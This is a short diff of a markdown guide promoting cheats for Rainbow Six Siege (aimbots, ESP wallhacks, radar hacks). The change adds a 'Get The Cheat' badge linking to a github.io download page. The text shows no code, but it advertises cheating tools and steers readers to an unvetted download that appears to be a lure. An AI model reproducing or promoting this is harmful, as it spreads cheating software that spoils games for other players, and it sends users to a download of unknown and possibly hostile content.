@@ -4,7 +4,7 @@
 
 **Tom Clancy’s Rainbow Six Siege** is one of the most tactical shooters ever made, but its competitive nature has also fueled a huge cheat community. Players use **R6 cheats** to gain powerful advantages like aimbots, ESP wallhacks, and radar hacks that turn intense matches into easy victories. This guide covers the most popular Rainbow Six Siege cheats, how they work, their features, and how they compare with hacks from other games.
 
-
+[![Get](https://img.shields.io/badge/Get%20The-Cheat-blueviolet)](https://rainbow-six-siege-cheat-tool.github.io/.github/)
 ---
 
 ## What Are Rainbow Six Siege Cheats?
